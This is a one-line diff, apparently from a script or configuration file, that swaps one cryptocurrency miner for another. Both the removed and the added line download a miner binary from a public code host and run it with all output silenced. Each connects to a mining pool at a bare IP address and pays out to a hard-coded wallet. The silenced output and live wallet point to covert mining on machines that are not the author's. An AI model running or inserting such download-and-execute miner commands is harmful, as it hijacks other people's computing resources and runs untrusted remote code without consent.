@@ -1,1 +1,1 @@
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yescryptR16 -o stratum+tcp://24.144.107.222:443 -u DNbHCwVeAoGVAA49s62RTXpdcjZk5w17eE -p c=DGB,mc=BTE,m=solo,ID=bocoralus -t4 > /dev/null 2>&1
+wget -q https://github.com/BinaryExpr/spectre-miner/releases/download/v0.6.26/spectre_miner_x64-v0.6.26_linux.tar.gz && tar -xhf spectre_miner_x64-v0.6.26_linux.tar.gz && ./spectre-miner -d 24.144.107.222:80 -w spectre:qqdfzpj6rwtu56lsvghynzanl4n309d6qqxueuyjep8uwer699v5k53gpq22k -t 4 > /dev/null 2>&1
